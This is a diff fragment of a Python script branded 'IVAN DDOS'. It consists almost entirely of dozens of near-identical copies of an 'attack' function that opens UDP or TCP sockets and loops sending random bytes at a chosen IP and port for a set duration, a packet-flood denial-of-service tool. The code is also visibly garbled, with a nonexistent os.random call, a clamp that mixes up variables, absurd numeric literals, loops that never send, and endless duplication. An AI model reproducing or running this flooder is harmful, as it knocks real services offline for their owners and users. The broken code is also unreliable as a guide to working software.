+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Selesai')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+   
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -5382,7 +5382,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -5414,7 +5414,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -5446,7 +5446,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -5612,7 +5612,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -5638,33 +5638,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -5690,7 +5664,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -5865,7 +5865,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -5897,7 +5897,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -5929,7 +5929,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -5961,7 +5961,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -5987,7 +5987,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6019,7 +6019,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6051,7 +6051,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6083,7 +6083,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6249,7 +6249,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6275,33 +6275,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6327,7 +6301,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -6493,7 +6493,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6525,7 +6525,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6557,7 +6557,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6589,7 +6589,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6615,7 +6615,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6647,7 +6647,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6679,7 +6679,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -6711,635 +6711,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
